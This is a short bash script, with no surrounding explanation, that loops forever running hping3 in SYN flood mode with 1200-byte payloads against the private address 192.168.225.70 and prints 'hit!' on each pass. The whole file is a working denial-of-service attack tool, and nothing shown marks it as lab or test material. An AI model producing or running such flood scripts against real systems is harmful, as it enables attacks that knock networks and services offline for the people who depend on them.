#!/bin/bash

# Infinite loop
while true; do
    hping3 -S 192.168.225.70 -d 1200 --flood
    echo "hit!"
    sleep 1  # Pauses for 1 second between each iteration
done